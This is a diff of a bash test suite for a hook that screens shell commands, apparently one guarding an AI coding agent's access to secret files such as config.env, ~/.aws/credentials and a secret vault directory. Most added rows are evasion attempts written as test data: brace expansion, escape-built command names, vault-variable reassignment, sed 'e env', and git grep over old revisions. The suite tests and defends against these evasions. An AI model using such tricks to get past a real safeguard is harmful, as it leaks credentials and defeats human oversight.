+    'nice -n 10 tar czf backup-$D.tgz src'
+expect_in "$P" ASK    "a brace in a wrapped command's operand asks"                   'sudo cp src/a.py{,.bak}'
+expect_in "$P" ALLOW  "a replacement string after parallel stays allowed"             'parallel echo {} ::: a b'
+expect_in "$P" DENY   "a brace sequence that builds grep in a wrapped command is screened as grep" \
+    'sudo g{r..r}ep -rn x .'
+expect_in "$P" ASK    "an assignment word with a variable after time asks"            'time A=$X ls src'
+expect_in "$GR" ALLOW "a clean git grep behind nice stays allowed"                    'nice -n 5 git grep -n x HEAD~1'
+expect_in "$P" ASK    "a vault path after a wrapper asks"                             'sudo $CLAUDE_SECRET_DIR/s.json'
+expect_in "$P" ASK    "a brace after the vault prefix of a wrapped word asks"         'sudo "$CLAUDE_SECRET_DIR"/{a,b}'
+expect_in "$P" ASK    "a variable after the vault prefix of a wrapped word asks"      'sudo $CLAUDE_SECRET_DIR/${X}'
+expect_in "$P" ASK    "a glob after the vault prefix of a wrapped word asks"          'sudo ${CLAUDE_SECRET_DIR}/*'
+expect_in "$P" ASK    "a vault path asks when the command reassigns the vault"        \
+    'export CLAUDE_SECRET_DIR=/etc ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks behind an assignment of the vault"           \
+    'CLAUDE_SECRET_DIR=/etc sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path as the command word asks"                         '$CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a quoted vault path as the command word asks"                  '"$CLAUDE_SECRET_DIR"/x'
+expect_in "$P" ASK    "a braced vault path as the command word asks"                  '${CLAUDE_SECRET_DIR}/x'
+expect_in "$P" ASK    "a vault path as the command word behind time asks"             'time $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path as the command word behind env options asks"      'env -i $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks when the command mentions IFS"               'IFS=/ sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks after a read of the vault variable"          \
+    'read CLAUDE_SECRET_DIR ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks after an attached read option naming it"     \
+    'read -aCLAUDE_SECRET_DIR x ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks after an attached printf -v naming it"       \
+    'printf -vCLAUDE_SECRET_DIR %s /etc ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path asks when an export of it feeds a pipe"           \
+    'export CLAUDE_SECRET_DIR=/tmp/x | sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault path with a default value asks"                       'sudo ${CLAUDE_SECRET_DIR:-/etc}/x'
+expect_in "$P" ASK    "a vault path after a wrapper and a plain operand asks"         'sudo $CLAUDE_SECRET_DIR/x y'
+expect_in "$P" ASK    "a vault variable name split by quotes asks"                    \
+    'sudo CLAUDE_SECRET_"DIR"=/etc $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault variable written by a computed name asks"             \
+    'printf -v "CLAUDE_SECRET_${n}" /etc ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ASK    "a vault variable made a nameref asks"                          \
+    'declare -n CLAUDE_SECRET_DIR=q ; sudo $CLAUDE_SECRET_DIR/x'
+expect_in "$P" ALLOW  "a literal wrapped command stays allowed"                      'timeout 5 make'
+expect_in "$P" ALLOW  "a variable assignment before the command stays allowed"        'A=$X ls src'
+# Only a numeric escape ($'\x69') or a $, glob or brace that is not quoted builds a name; a regex backslash, a quote or
+# a JSON brace in a quoted operand builds nothing.
+expect_in "$P" ALLOW  "a regex backslash in find -exec grep stays allowed" \
+    "find . -name '*.py' -exec grep -l 'a\\.b' {} +"
+expect_in "$P" ALLOW  "a regex backslash after timeout stays allowed" \
+    "timeout 30 grep -E 'a\\.b' src/a.py"
+expect_in "$P" ALLOW  "an escaped alternation after sudo stays allowed"                 "sudo grep 'foo\\|bar' src/a.py"
+expect_in "$P" ALLOW  "a regex backslash after xargs stays allowed"                     "xargs -0 grep -l 'a\\.b'"
+expect_in "$P" ALLOW  "an escaped slash in a sed program after nice stays allowed" \
+    "nice -n 5 sed 's/a\\/b/c/' src/a.py"
+expect_in "$P" ALLOW  "a regex backslash after command stays allowed" \
+    "command grep -n 'a\\.b' src/a.py"
+expect_in "$P" ALLOW  "a regex backslash after ! stays allowed"                         "! grep -q 'a\\.b' src/a.py"
+expect_in "$P" ALLOW  "a backslash in a quoted operand after time stays allowed"        "time ls 'a\\b'"
+expect_in "$P" ALLOW  "a JSON body after time stays allowed" \
+    "time curl -s -d '{\"a\":1}' url"
+expect_in "$P" ALLOW  "a JSON body after timeout stays allowed" \
+    "timeout 10 curl -d '{\"a\":1}' url"
+expect_in "$P" ALLOW  "a quoted JSON body with a comma after time stays allowed" \
+    "time curl -d '{\"a\":1,\"b\":[2,3]}' url"
+expect_in "$P" ALLOW  "a quoted JSON operand after time stays allowed"                 "time ls '{\"a\":1}'"
+expect_in "$P" ALLOW  "inline code with quotes after time stays allowed" \
+    "time python3 -c 'print(\"hi\")'"
+expect_in "$P" ASK    "an octal escape inside git asks"                                 "\$'g\\151t' grep -n x"
+expect_in "$P" ASK    "a unicode escape inside git asks"                                "\$'g\\u0069t' grep -n x"
+expect_in "$P" DENY   "a nested brace that builds grep in a wrapped command is screened as grep" \
+    'sudo g{r,{r,r}}ep -rn x .'
+expect_in "$P" ASK    "a stepped brace sequence in a wrapped command asks"              'sudo g{r..s..2}ep -rn x .'
+expect_in "$P" ASK    "a numeric brace sequence in a wrapped command asks"              'sudo g{1..3}ep -rn x .'
+# command -v and -V only name a command, so their operands run nothing.
+expect_in "$P" ALLOW  "command -v of a quoted variable stays allowed"                   'command -v "$tool"'
+expect_in "$P" ALLOW  "command -v of a variable with a redirection stays allowed"       'command -v $tool >/dev/null'
+expect_in "$P" ALLOW  "command -pv of a variable stays allowed"                         'command -pv "$tool"'
+expect_in "$P" ALLOW  "command -V of a variable stays allowed"                          'command -V $tool'
+expect_in "$P" ALLOW  "command -p -v of a variable stays allowed"                       'command -p -v $tool'
+expect_in "$P/src" ALLOW "a find -exec of command -v stays allowed"                      'find . -exec command -v {} \;'
+expect_in "$P/src" ASK "an assembled name in a second -exec after command -v asks" \
+    'find . -exec command -v {} \; -exec g${X}it grep -n x {} +'
+expect_in "$P/src" ASK "an assembled name in -execdir after command -v asks" \
+    'find . -exec command -v {} \; -execdir g${X}it grep -n x {} +'
+expect_in "$P/src" ASK "an assembled name after command -v ended by + asks" \
+    'find . -exec command -v {} + -exec g${X}it grep -n x {} +'
+expect_in "$P" ASK    "command -p running an assembled name asks"                      'command -p g${X}it grep -n x'
+expect_in "$P" ASK    "an assembled name after a command -v stage asks" \
+    'command -v $tool ; g${X}it grep -n x'
+# taskset and chrt lead a wrapper's stage.
+expect_in "$GR" ASK   "a variable inside git asks behind taskset"                       'taskset 1 g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind chrt"                          'chrt 1 g${X}it grep -n x'
+
+# Brace expansion of operands: the shell expands an unquoted brace before the command runs, so each expansion is
+# screened as the path it would be written as. A word the expander cannot follow within its bounds asks.
+expect DENY  "an empty brace alternative repeats a secret name"                 'cat config.env{,}'
+expect DENY  "a brace alternative holding a path to a secret"                   'cat /{x,y/config.env}'
+expect DENY  "a diff of a secret and its example"                               'diff config.env{,.example}'
+expect DENY  "a copy of a secret to a backup name"                              'cp config.env{,.bak}'
+expect DENY  "head reads a secret among brace alternatives"                     'head -n1 {a,config.env}'
+expect DENY  "tail reads a secret among brace alternatives"                     'tail -n1 {a,config.env}'
+expect DENY  "less reads a secret among brace alternatives"                     'less {a,config.env}'
+expect DENY  "a secret among three alternatives under a directory"              'cat dir/{a,b,config.env}'
+expect DENY  "a secret in a nested brace"                                       'cat dir/{a,{b,config.env}}'
+expect DENY  "a secret behind two brace words"                                  'cat {a,b}/{c,config.env}'
+expect DENY  "a secret name built from a suffix brace"                          'cat x{,.env}'
+expect DENY  "a secret name behind a numeric sequence"                          'cat {1..3}/config.env'
+expect DENY  "a secret credentials file behind a tilde brace"                   'cat ~/.aws/{config,credentials}'
+expect DENY  "a grep file operand among brace alternatives"                     'grep x {a,config.env}'
+expect DENY  "an rg file operand among brace alternatives"                      'rg x {a,config.env}'
+expect DENY  "a jq file operand among brace alternatives"                       'jq . {a,config.env}'
+expect DENY  "a git diff pathspec among brace alternatives"                     'git diff -- config.env{,}'
+expect DENY  "a git log -p pathspec among brace alternatives"                   'git log -p -- {a,config.env}'
+expect DENY  "a git grep revision pathspec among brace alternatives"            'git grep x HEAD -- config.env{,}'
+expect DENY  "a reader behind a wrapper reads a brace expansion"                'sudo cat config.env{,}'
+expect DENY  "a brace expansion in a later stage"                               'echo a | cat config.env{,}'
+expect DENY  "a secret in a brace beside an option value"                       'head -n 1 -q {a,config.env}'
+expect ASK   "more expansions than the bound asks" \
+    'cat {a,b,c,d,e,f,g,h,i}{a,b,c,d,e,f,g,h,i}'
+expect ASK   "a sequence of 100 asks"                                           'cat {1..100}'
+expect ASK   "a sequence of 65 expansions asks"                                 'cat {1..5}{1..13}'
+expect ASK   "a letter range that is no sequence asks"                          'cat {a..zz}'
+expect ASK   "a zero-padded sequence asks"                                      'cat {01..03}'
+expect ASK   "a stepped sequence asks"                                          'cat {1..9..2}'
+expect ASK   "a sequence mixing a digit and a letter asks"                      'cat {1..a}'
+expect ASK   "a sequence mixing letter cases asks"                              'cat {a..E}'
+expect ASK   "a brace word holding a quoted brace and a space asks"             "cat 'a b'{c,'d}e'}"
+expect ASK   "a brace word holding a space inside the braces asks"              'cat {a,"b c"}'
+expect ASK   "a brace word holding a quote between its braces asks"             'cat "$A"{a,b}"$B"{c,d}'
+expect ASK   "a brace word holding an escaped brace and a live one asks"        'cat "a b"\{x,y}{c,d}'
+expect ASK   "a brace word holding a numeric escape asks"                       "cat \$'a\\x62'{c,d}"
+expect ASK   "a brace word holding a backquote asks"                            'cat {a,b}`x`'
+expect ASK   "a brace with a stray close brace asks"                            'cat x{a,b}}'
+expect ASK   "a brace holding an open sequence asks"                            'cat {1..}'
+expect ASK   "expansions past the bound for a whole command ask" \
+    'echo {a..h}{a..h} {a..h}{a..h} {a..h}{a..h} {a..h}{a..h} {a..h}{a..h}'
+expect ALLOW "64 expansions are inside the bound"                               'echo {a..h}{a..h}'
+expect ALLOW "clean names behind a brace stay allowed"                          'cat {a,b}.md'
+expect ALLOW "a brace in a directory name stays allowed"                        'mkdir -p src/{a,b}'
+expect ALLOW "a numeric sequence stays allowed"                                 'echo {1..3}'
+expect ALLOW "a descending sequence stays allowed"                              'echo {3..1} {c..a} {-1..1}'
+expect ALLOW "an example name behind a brace stays allowed"                     'cat {a,b}.env.example'
+expect ALLOW "a numbered name that is no secret stays allowed"                  'cat config.env{1..3}'
+expect ALLOW "a quoted secret-shaped variable beside a brace stays text"        "echo '\$GITHUB_TOKEN'{a,b}"
+expect ALLOW "a quoted brace is a literal name"                                 "cat '{a,config.env}'"
+expect ALLOW "a double-quoted brace is a literal name"                          'cat "{a,config.env}"'
+expect ALLOW "an escaped brace is a literal name"                               'cat \{a,config.env\}'
+expect ALLOW "find -exec {} is no brace expansion"                              'find . -exec grep -l x {} +'
+expect ALLOW "an empty brace is a literal"                                      'cat {}'
+expect ALLOW "a one-element brace is a literal"                                 'cat {config.env1}'
+expect ALLOW "a quoted JSON body is no brace expansion"                         "curl -d '{\"a\":1,\"b\":[2,3]}' url"
+expect ASK   "a brace inside a parameter expansion's default asks"              'cat ${X:-{a,config.env}}'
+expect DENY  "a brace after a quoted \$ is a brace"                             "cat '\$'{a,config.env}"
+expect DENY  "a brace after an escaped \$ is a brace"                           'cat \${a,config.env}'
+expect DENY  "a brace after a literal \$ closing double quotes is a brace"       'cat "$"{a,config.env}'
+expect ALLOW "a brace after a live \$ in double quotes screens like the written-out words" 'cat "$X"{a,b}'
+expect DENY  "a brace after a live \$ in double quotes names a secret"           'cat "$P"/{a,config.env}'
+expect DENY  "a brace after a bare variable names a secret"                      'cat $X{a,config.env}'
+expect ASK   "a brace after a quoted and a live \$ asks"                         "cat '\$'\$X{a,b}"
+# The everyday idioms: the expansions are screened as the written-out words are, which are allowed.
+expect ALLOW "a quoted variable with a suffix brace"                             'cp "$f"{,.bak}'
+expect ALLOW "a quoted variable with a brace in the next component"              'mkdir -p "$DIR"/{a,b}'
+expect ALLOW "a bare variable with a brace in the next component"                'cat $HOME/{a,b}.txt'
+expect ALLOW "a braced variable with a brace in the next component"              'cat ${X}/{a,b}'
+expect ALLOW "a quoted braced variable with a brace beside it"                   'cp "${f}"{,.bak}'
+expect ALLOW "a quoted name holding a space with a suffix brace"                 'cp "My File.txt"{,.bak}'
+expect ALLOW "a single-quoted name holding a space with a brace"                 "cat 'a b'{c,d}"
+expect ALLOW "a variable with a suffix brace in an rm"                           'rm -f "$f"{,.bak}'
+expect ALLOW "a variable the brace itself builds"                                'cat {$,}{a}'
+expect ALLOW "a variable beside a brace after a quoted word"                     'cat "$f"{,.bak} "My File"{,.bak}'
+expect DENY  "a quoted name with a space and a suffix brace names a secret"      'cat "a b"{,.env}'
+expect DENY  "a quoted name with a space and an alternative names a secret"      'cat "a b"{c,config.env}'
+expect DENY  "a quoted name with a space and a directory brace names a secret"   'cat "a b"/{c,config.env}'
+expect ASK   "a backquote beside a quoted variable and a brace asks"             'cat "$f"`id`{a,b}'
+expect ASK   "a command substitution beside a quoted variable and a brace asks"  'cat "x"$(id){a,b}'
+expect ASK   "a redirect target holding a space and a brace asks"                'cat < "a b"{c,d}'
+expect ASK   "a brace with a quoted close brace asks"                           "cat {a,config.env}'}'"
+# The shell passes the expansions in the brace's place, so a walk sees the real argv: a brace in an option's value
+# cannot hide the subcommand that follows, and holds the same asks as the brace did.
+expect_in "$GR" DENY "a brace in -C's value builds git's subcommand"            'git -C {.,grep} -n x'
+expect_in "$GR" DENY "a brace in -C's value builds git show of a secret"        'git -C {.,show} HEAD:.env'
+expect_in "$GR" ASK  "a brace in -C's value builds an unknown subcommand"       'git -C {.,x} grep -n x'
+expect_in "$GR" ASK  "a brace in -C's value builds a subcommand of two dots"    'git -C {.,.} grep -n x'
+expect_in "$GR" ASK  "a brace in --git-dir's value builds git grep"             'git --git-dir {.git,grep} -n x'
+expect_in "$GR" ASK  "a brace in --work-tree's value builds an unknown subcommand" 'git --work-tree {.,x} grep -n x'
+expect_in "$GR" DENY "a brace beside git grep's pattern is no revision to clear" 'git grep -n {x,y}'
+expect_in "$GR" DENY "a brace after git grep -e is no revision to clear"        'git grep -e {x,y}'
+expect_in "$GR" DENY "a brace after git grep -f is no revision to clear"        'git grep -f {a,b}'
+expect ASK   "a brace builds the command word"                                  '{cat,ls} f'
+expect_in "$GR" ASK "a brace builds git's subcommand"                           'git {log,x}'
+expect_in "$GR" ASK "a brace after = builds git's subcommand word"              'git s={a,b}'
+expect_in "$GR" ASK "a brace builds the name of a git option"                   'git --{git-dir,work-tree}=. log'
+expect DENY  "a brace voids the roles of a grep stage, as it always has"        'grep {config.env,y} f'
+expect DENY  "a brace beside the ssh directory keeps its own screen"            'cat ~/.ssh/{config,known_hosts}'
+# A revision a brace builds is held like a written one: GXD tracked config.env at branch old and deleted it at HEAD,
+# GXH tracks it at HEAD with HEAD~1 clean and nothing in the work tree.
+GXD="$pt/gxd"
+GXH="$pt/gxh"
+mkdir -p "$GXD" "$GXH"
+git -C "$GXD" init -q
+printf 'SECRETVALUE\n' >"$GXD/config.env"
+git -C "$GXD" add config.env
+git -C "$GXD" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+git -C "$GXD" branch old
+git -C "$GXD" rm -q config.env
+printf 'x\n' >"$GXD/a.md"
+git -C "$GXD" add a.md
+git -C "$GXD" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m two
+git -C "$GXH" init -q
+printf 'x\n' >"$GXH/notes.md"
+git -C "$GXH" add notes.md
+git -C "$GXH" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+printf 'SECRETVALUE\n' >"$GXH/config.env"
+git -C "$GXH" add config.env
+git -C "$GXH" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m two
+rm "$GXH/config.env"
+expect_in "$GXD" DENY "a written revision holding the deleted secret is denied"  'git grep -n SECRETVALUE old'
+for f in 'git grep -n SECRETVALUE {old,HEAD}' 'git grep -n SECRETVALUE HEAD~{1,2}' 'git grep -n SECRETVALUE old{,}' \
+        'git grep -n SECRETVALUE HEAD~1{,}' 'git grep -n SECRETVALUE {HEAD~1,HEAD}' \
+        'git grep -n -e SECRETVALUE {old,HEAD}' 'git grep -n SECRETVALUE {a.md,old}' \
+        'git grep -n SECRETVALUE {zzz,yyy}' 'git grep -n {SECRETVALUE,HEAD~1}'; do
+    expect_in "$GXD" ASK "a brace-built revision of a deleted secret asks: $f" "$f"
+done
+for f in 'git grep -n x {HEAD,HEAD}' 'git grep -n x HEAD{,}' 'git grep -n x {HEAD,x}' 'git grep -n x {HEAD,HEAD~1}' \
+        'git grep -n x HEAD~{0,1}' 'git grep -n x {HEAD,y}' 'git grep -n x src/{a,b}'; do
+    expect_in "$GXH" DENY "a brace-built revision is no operand to clear, so the tracked secret is found: $f" "$f"
+done
+expect_in "$GXH" ALLOW "a written clean revision stays allowed"                  'git grep -n x HEAD~1'
+# A $ that is part of a parameter expansion is no brace; a ${ holding a brace of its own, or beside a quoted $, asks.
+for f in 'echo ${s%,*}' 'echo ${s%%,*}' 'echo ${s#*,}' 'echo ${x//,/-}' 'x=${s%,*}' 'cp ${f%,*} dst' 'ls ${DIR:-a,b}' \
+        'ls ${X:-1..3}' 'git log --format=${F:-%h,%s}' 'git log --tags=${TAGS:-a,b}'; do
+    expect ALLOW "a parameter expansion with a comma is no brace: $f" "$f"
+done
+expect ASK   "a parameter expansion beside a quoted \$ may be text"             "cat '\$'{a,b}\${X}"
+# A shell with MULTIOS (zsh) opens every file an input redirection's brace expands to.
+expect DENY  "an input redirection of a brace holding a secret twice"           'cat <config.env{,}'
+expect DENY  "an input redirection of a brace holding a secret"                 'cat <{a,config.env}'
+expect DENY  "tr reads a secret behind a spaced input redirection brace"        'tr a b < {a,config.env}'
+expect DENY  "head reads a secret behind an input redirection brace"            'head -n1 <{a,config.env}'
+expect ALLOW "wc counts a secret behind an input redirection brace, as it does a literal one" 'wc -l <{a,config.env}'
+expect ALLOW "an input redirection of clean names stays allowed"                'cat <{a,b}'
+expect ASK   "an input redirection brace past the bound asks"                   'cat <{1..100}'
+# Past the length a quoting marker is kept for, a brace is still read: a word that holds one has its marker.
+long_pad=$(printf 'd%.0s' {1..300})
+expect DENY  "a 300-character word with a brace holding a secret is denied"     "cat $long_pad/{a,config.env}"
+expect DENY  "a 1100-character word with a brace holding a secret is denied" \
+    "cat $(printf 'd%.0s' {1..1100})/{a,config.env}"
+expect DENY  "a 300-character quoted word with a space and a brace holding a secret is denied" \
+    "cat '$long_pad x'{a,config.env}"
+expect ASK   "a 300-character word with a space inside its braces asks"         "cat {a,'$long_pad x'}"
+expect ALLOW "a 300-character quoted word with a space and a clean brace allowed" "cat '$long_pad x'{a,b}"
+expect ALLOW "a 300-character quoted JSON body with braces and commas stays allowed" \
+    "curl -d '{\"a\":1,\"b\":[2,3],\"pad\":\"$long_pad\"}' url"
+expect ALLOW "a long single-quoted brace and padding stays allowed"             "echo '{a,b}$(printf 'd%.0s' {1..600})'"
+expect ALLOW "a long double-quoted brace with a space and padding stays allowed" \
+    "echo \"{a,b} x $(printf 'd%.0s' {1..600})\""
+expect ALLOW "a long single-quoted padding before a brace stays allowed" \
+    "echo '$(printf 'd%.0s' {1..1000}){a,b}'"
+expect ASK   "a long word with a live brace and a quoted close brace asks"      "cat $long_pad{a,config.env}'}'"
+expect ASK   "a word past the expander's work bound asks"                      "cat $(printf 'd%.0s' {1..30000}){a,b}"
+
 # bash32_rows: rows that must also hold with the hook under /bin/bash (bash 3.2, a stock Mac's bash).
 bash32_rows() {
+    expect      ALLOW "under bash 3.2, a single-quoted cat > heredoc writes a file" \
+        $'cat > out.txt <<\'EOF\'\n#!/usr/bin/env python3\nfor x in y; do\nEOF'
     expect_in "$P" DENY  "under bash 3.2, a recursive grep of a root holding .env denied" 'grep -rn KEY .'
     expect_in "$P" ALLOW "under bash 3.2, grep -rl allowed"                       'grep -rl KEY .'
     expect_in "$R" ALLOW "under bash 3.2, rg in a repo whose .env is ignored allowed" 'rg KEY'
@@ -2345,6 +3648,12 @@ bash32_rows() {
     expect_in "$GR" ALLOW "under bash 3.2, a pathspec naming a clean tree allowed" 'git grep -n x HEAD -- docs'
     expect_in "$GR" DENY  "under bash 3.2, a revision tree holding a secret denied" 'git grep -n x HEAD -- .'
     expect_in "$R" ALLOW "under bash 3.2, git grep of an exclude-only pathspec allowed" "git grep -n KEY -- ':!docs'"
+    expect_in "$GR" ALLOW "under bash 3.2, a clean revision with no -- allowed" 'git grep -n x HEAD~1'
+    expect_in "$GR" DENY  "under bash 3.2, a revision with no -- holding a secret denied" 'git grep -n x HEAD'
+    expect_in "$GR" ASK   "under bash 3.2, a variable in git's subcommand asks" 'git ${X}grep -n x HEAD~0'
+    expect_in "$GR" ASK   "under bash 3.2, a variable inside git asks"       'g${X}it grep -n x'
+    expect_in "$GR" ALLOW "under bash 3.2, a glob pathspec listed under its directory" \
+        "git grep -n x HEAD -- 'docs/*.md'"
     expect_in "$GR" ASK   "under bash 3.2, a tree revision asks"        'git grep -n x HEAD^{tree} -- notes.md'
     expect_in "$GC" ASK   "under bash 3.2, a revision after cd asks"    'cd app && git grep -n x HEAD -- config'
     expect_in "$GC" ALLOW "under bash 3.2, a revision confined to a root blob allowed" 'git grep -n x HEAD -- config'
@@ -2359,6 +3668,61 @@ bash32_rows() {
     expect      DENY  "under bash 3.2, luajit -j value fed a secret denied" 'luajit -j off < .env'
     expect      DENY  "under bash 3.2, a path-form nested docker stack config denied" \
         'docker exec c /usr/bin/docker stack config'
+    expect_in "$GS" ALLOW "under bash 3.2, a quoted * is a literal name" "cat '*'"
+    expect      DENY  "under bash 3.2, a quoted variable piped on is denied" "echo '\$GITHUB_TOKEN' | envsubst"
+    expect_in "$GA" DENY  "under bash 3.2, a joined sed -e program keeps its glob live" "sed -n -e'1e ls **/x' f"
+    expect      ALLOW "under bash 3.2, an e inside a sed address regex is no e command" "sed -n '/^a.*e/p' f"
+    expect_in "$GA" DENY  "under bash 3.2, gawk --source's system() keeps its regex a glob" \
+        "gawk --source='{system(\"ls\")} /x.*/' f"
+    expect      DENY  "under bash 3.2, sed's e command runs a shell" "sed '1e env' f"
+    expect      ALLOW "under bash 3.2, sed with a range and a regex address" "sed -n '/pattern/,/end/p' f"
+    expect      ALLOW "under bash 3.2, sed with a bracket holding the delimiter" "sed 's/[^/]*\$//' f"
+    expect      DENY  "under bash 3.2, mawk is a reader" "mawk 1 config.env"
+    expect      DENY  "under bash 3.2, a wrapper's option value named awk does not hide a sed stage" \
+        "sudo -u awk sed '1e env' f"
+    expect      DENY  "under bash 3.2, a later sed name starts the operand walk again" "nice sed -n p sed '1e env' f"
+    expect      ALLOW "under bash 3.2, a sed name taken as an operand is dropped" "nice sed sed 1d f"
+    expect      DENY  "under bash 3.2, a program ending in a sed name is not dropped unread" "nice sed '1e env/sed'"
+    expect      DENY  "under bash 3.2, an unparseable operand after an unknown option is denied" "sed --x p k f"
+    expect      ALLOW "under bash 3.2, BSD sed -i leaves its suffix alone" "sed -i .bak 's/a/b/' f"
+    expect      ALLOW "under bash 3.2, a reader-named pattern adds no reader" 'grep -e cat -e config.env f'
+    expect      DENY  "under bash 3.2, a wrapper's option value is no command position" 'sudo -u grep cat -e config.env'
+    expect      DENY  "under bash 3.2, an unquoted glob after -e expands" 'grep -e *env f'
+    expect      ALLOW "under bash 3.2, a quoted glob in the pattern slot is text" "grep '*env' f"
+    expect      DENY  "under bash 3.2, an unquoted variable may split into an option" 'grep -m $X config.env f'
+    expect      DENY  "under bash 3.2, a GREP_ assignment voids the pattern reading" \
+        'GREP_COLORS=x grep -e config.env f'
+    expect      DENY  "under bash 3.2, an unquoted variable in a jq --arg slot may split" "jq --arg k \$V '.key' f.json"
+    expect      ALLOW "under bash 3.2, a jq filter ending in .key allowed" "jq 'to_entries[]|.key' f.json"
+    expect      DENY  "under bash 3.2, an unknown jq option voids the filter reading" "jq --frob '.key' f.json"
+    expect      ALLOW "under bash 3.2, git log -S of a secret-shaped string allowed" 'git log -S config.env'
+    expect      DENY  "under bash 3.2, an unknown git log option voids the value reading" \
+        'git log --anchored -S config.env -p'
+    expect      DENY  "under bash 3.2, git log after -- reads its pathspec" 'git log -p -- config.env'
+    expect      DENY  "under bash 3.2, an unquoted variable before -S may split into --" 'git log -n $X -S config.env'
+    expect      ALLOW "under bash 3.2, git diff --stat of a secret path allowed" 'git diff --stat -- config.env'
+    expect      ALLOW "under bash 3.2, git diff --name-status -M allowed" 'git diff --name-status -M -- config.env'
+    expect      DENY  "under bash 3.2, a patch flag beside --stat denied" 'git diff --stat -p -- config.env'
+    expect      DENY  "under bash 3.2, git diff of a secret path denied" 'git diff -- config.env'
+    expect      DENY  "under bash 3.2, an unquoted variable beside --stat may split into -p" \
+        'git diff --stat $X -- config.env'
+    expect      DENY  "under bash 3.2, a hex-escaped -p beside --stat denied" "git diff --stat \$'\\x2dp' -- config.env"
+    expect      DENY  "under bash 3.2, a hex-escaped -- makes -S a pathspec of git log" \
+        "git log -p \$'\\x2d\\x2d' -S config.env"
+    expect      DENY  "under bash 3.2, a hex-escaped --file= names a grep pattern file" \
+        "grep \$'\\x2d\\x2dfile=config.env' x"
+    expect      DENY  "under bash 3.2, a hex-escaped -f makes the first jq word a program file" \
+        "jq config.env \$'\\x2df'"
+    expect      ALLOW "under bash 3.2, git log --author= text allowed" 'git log --author=config.env'
+    expect      DENY  "under bash 3.2, jq -f with doubled slashes is denied" 'jq -f //dev/stdin x.json'
+    expect      DENY  "under bash 3.2, jq -f with a dot segment is denied" 'jq -f /dev/./fd/3 x.json'
+    expect      DENY  "under bash 3.2, jq -f with a leading dot segment is denied" 'jq -f /./dev/stdin x.json'
+    expect      DENY  "under bash 3.2, an import path written with an escape is denied" \
+        "jq -n 'import \"./\\u0073ecrets/app\" as \$d; \$d'"
+    expect      DENY  "under bash 3.2, modulemeta of a computed module name is denied" \
+        "jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+    expect      DENY  "under bash 3.2, a sequence and a nested brace holding a secret are denied" \
+        'cat {1..3}/{a,{b,config.env}}'
 }
 if [[ -x /bin/bash ]] && [[ "$(/bin/bash -c 'echo "${BASH_VERSINFO[0]}"')" == 3 ]]; then
     HOOK_BASH=/bin/bash
@@ -2601,6 +3965,12 @@ expect_fast DENY "many one-character colon words" "cat $(printf ': %.0s' {1..327
 expect_fast DENY "many colon stages" "$(printf ':|%.0s' {1..32760})cat .env"
 expect_fast DENY "many short variant words behind every walk" \
     "sudo jq awk perl -e cp printenv ps su watch xargs cat $(printf -- '-:= %.0s' {1..16300}).env"
+# Brace words: each expands at most BX_CAP words, a command BX_TOTAL in all, and the expander's work is bounded.
+expect_fast DENY "many brace words, past the expansion bound for a command" "cat $(printf '{a,b} %.0s' {1..8000}).env"
+expect_fast DENY "brace words each at the expansion bound" "cat $(printf '{1..8}{a..h} %.0s' {1..40}).env"
+expect_fast DENY "many brace words that do not pair off" "cat $(printf '{a,b %.0s' {1..8000}).env"
+expect_fast DENY "one long brace word" "cat $(printf 'a%.0s' {1..1000}){x,y}.env"
+expect_fast DENY "one 64 KiB word of braces" "cat $(printf '{a,b}%.0s' {1..13000}).env"
 # Glob words whose brackets dominate their cost, at the bound's wildcard count.
 cls='[[:alnum:][:punct:]]'
 expect_fast DENY "many bracketed glob words" \
@@ -2650,6 +4020,11 @@ expect_fast DENY "a commit heredoc behind many option words" \
 expect_fast ALLOW "a recursive grep of 64 directories" "grep -rn KEY $(printf 'd%d ' {1..64})"
 # Many distinct wildcard-only operands: the first 64 are expanded, the rest hold an ask, and the .env denies.
 expect_fast DENY "many wildcard-only operands" "cat $(printf 'd%d/* ' {1..5000}).env"
+expect ASK "wildcard-only operands past the 64th hold an ask" "cat $(printf 'd%d/* ' {1..70})"
+# 65 directories that do not exist fill the record of directories for xargs without expanding anything; the ask for the
+# operands past the 64th expansion must still be held.
+expect ASK "an ask held past the 64th expansion after 65 unexpanded directories" \
+    "cat $(printf 'z%d/* ' {1..65}) $(printf 'd%d/* ' {1..65})"
 # Many distinct directory globs: the first 64 are expanded and recorded for xargs, the rest hold an ask.
 expect_fast DENY "many directory-glob operands" "cat $(printf 'd%d*/x* ' {1..5000}).env"
 # Many git grep stages, then a secret read: git is asked about submodules once per directory, not once per stage.
@@ -2699,6 +4074,15 @@ expect_fast DENY "many heroku run words" "$(printf 'heroku run a %.0s' {1..1900}
 expect_fast DENY "a long python3 option bundle fed a secret" "python3 -$(printf 's%.0s' {1..65000}) < .env"
 expect_fast DENY "a long node option bundle fed a secret" "node -$(printf 's%.0s' {1..65000}) < .env"
 expect_fast DENY "a long php option bundle fed a secret" "php -$(printf 's%.0s' {1..65000}) < .env"
+# The sed scan is held to a byte budget for the whole command, however the text is split over stages and -e values.
+sd=$(printf 'd;%.0s' {1..500})
